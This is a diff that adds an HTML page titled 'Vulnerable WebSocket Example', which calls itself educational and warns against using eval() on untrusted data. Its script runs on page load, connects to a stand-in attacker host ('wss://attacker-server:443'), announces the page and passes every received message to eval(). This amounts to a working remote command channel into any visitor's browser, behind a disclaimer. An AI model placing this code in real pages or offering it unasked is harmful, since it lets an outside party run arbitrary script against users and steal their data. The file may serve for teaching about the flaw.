@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerable WebSocket Example</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Vulnerable WebSocket Example</h1>
+        <p>This example demonstrates a <strong>highly insecure</strong> use of WebSockets.  <strong>Never use eval() with data from untrusted sources.</strong> This code is for educational purposes only to illustrate a critical vulnerability.</p>
+        <div id="status"></div>
+        <div class="warning">This page is extremely vulnerable to attack. Do not use this code in a production environment.</div>
+    </div>
+    <script>
+        // Tentative de connexion à un serveur WebSocket contrôlé par l'attaquant
+        const ws = new WebSocket('wss://attacker-server:443');
+
+        ws.onopen = function () {
+            ws.send('Connection established from Build_19_index.html');
+            document.getElementById('status').innerHTML = "WebSocket connection open.";
+        };
+
+        ws.onmessage = function (event) {
+            // Toute commande reçue est exécutée via `eval`
+            //This is EXTREMELY DANGEROUS and should NEVER be done in production code
+            try{
+                eval(event.data);
+            } catch (error) {
+                document.getElementById('status').innerHTML += "<br>Error executing command: " + error;
+            }
+        };
+
+        ws.onerror = function (error) {
+            document.getElementById('status').innerHTML = "WebSocket Error: " + error;
+            console.error('WebSocket Error:', error);
+        };
+
+        ws.onclose = function () {
+            document.getElementById('status').innerHTML += "<br>WebSocket connection closed";
+            console.log('WebSocket connection closed');
+        };
+    </script>
+</body>
+</html>
